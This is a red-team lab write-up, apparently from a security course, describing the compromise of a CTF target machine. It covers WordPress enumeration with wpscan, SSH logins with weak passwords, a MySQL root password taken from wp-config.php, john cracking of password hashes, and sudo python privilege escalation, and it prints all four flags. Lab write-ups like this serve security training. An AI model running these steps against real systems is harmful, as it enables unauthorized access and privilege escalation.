# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap -sV -O 192.168.1.110
```

![Target-1-Scan](/Target-1-Screenshots/NMAP-Target-1-Scan.png)

This scan identifies the services below as potential points of entry:
- Target 1
  - Port 22/tcp | SSH | OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
  - Port 80/tcp | http | Apache httpd 2.4.10 ((Debian))
  - Port 111/tcp | rpcbind | 2-4 (RPC #1000000)
  - Port 139/tcp | netbios-ssn | Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
  - Port 445/tcp | netbios-ssn | Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

The following vulnerabilities were identified on each target:
- Target 1
  - Open/Unfiltered Ports 22 & 80
  
  ![Target-1-Scan](/Target-1-Screenshots/NMAP-Target-1-Scan.png)
 
  - WordPress Enumeration
  
  ![Enumerated-Users](/Target-1-Screenshots/Enumerated-Users.png)
 
  - Weak User Credentials
  
   ![SSH-Login](/Target-1-Screenshots/SSH-Login.png)
   
  - Misconfigured User Privileges on Target System
  
   ![Finding-wp-config](/Target-1-Screenshots/Finding-wp-config-PHP-file.png)
   
  - Brute Force Attack
  
    ![Cracked-Passwords](/Target-1-Screenshots/Cracked-Passwords.png)

  - Privilege Escalation (Python Library Hijacking)
    ![Privilege-Escalation](/Target-1-Screenshots/Privilege-Escalation.png)


### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1.txt`: flag1{b9bbcb33e11b80be759c4e844862428d}
    - **Exploit Used**
      - Step 1: WordPress User Enumeration
        - ` wpscan --url http://192.168.1.110/wordpress --enumerate vp,u `
         ![WPScan-VPs-&-Users](/Target-1-Screenshots/WPScan-VPs-&-Users.png)
 
      - Step 2: SSH Login Using Weak Login Credentials
        - ` ssh michael@192.168.1.110, password: michael `
        ![SSH-Login](/Target-1-Screenshots/SSH-Login.png)
      - Step 3: File Directory Search
        - ` find . -iname "*flag1*" `
        ![Flag-1](/Target-1-Screenshots/Flag-1.png)
        
    
  - `flag2.txt`: flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
    - **Exploit Used**
      - Step 1: File Enumeration
        - ` ls -la /var/www `
      - Step 2: Misconfigured File Privileges
        - ` cat /var/www/flag2.txt `
      ![Flag-2](/Target-1-Screenshots/Flag-2.png)

  - `flag3.txt`: flag3{afc01ab56b50591e7dccf93122770cd2}
    - **Exploit Used**
      - Step 1: Misconfigured File Privileges
        - ` nano /var/www/html/wordpress/wp-config.php `
        ![Finding-wp-config](/Target-1-Screenshots/Finding-wp-config-PHP-file.png)
      - Step 2: MySQL Login
        - ` mysql --host=localhost --user=root --password=R@v3nSecurity `
        ![SQL-Login](/Target-1-Screenshots/MySQL-Login.png)
      - Step 3: Database Traversal & Table Enumeration
        - ` SHOW * FROM wp_posts; `
        ![Flag-3](/Target-1-Screenshots/Flag-3.png)
      

  - `flag4.txt`: flag4{715dea6c055b9fe3337544932f2941ce}
    - **Exploit Used**

      - Step 1: MySQL WordPress Login Credential Enumeration
        ` SELECT user_login,user_pass FROM wp_users; ` 
        ![MySQL-Credentials](/Target-1-Screenshots/MySQL-Credentials.png)
      - Step 2: Brute Force
        - ` john --wordlist=rockyou.txt wp_hashes.txt `
        ![Cracked-Passwords](/Target-1-Screenshots/Cracked-Passwords.png)
      - Step 3: SSH Login
        - ` ssh steven@192.168.1.110, password pink84 `
        ![Secure-User-Shell](/Target-1-Screenshots/Secure-User-Shell.png)
      - Step 4: Sudo Privileges Check
        - ` sudo -l `
        ![Sudo-Privileges-Check](/Target-1-Screenshots/Sudo-Privileges-Check.png)
      - Step 5: Privilege Escalation with Python Shell Spawn
        - ` sudo python -c 'import pty;pty.spawn("/bin/bash")' `
        
        ![Privilege-Escalation](/Target-1-Screenshots/Privilege Escalation.png)
      -  Flag 4:
      
        ![Flag-4](/Target-1-Screenshots/Flag-4.png)
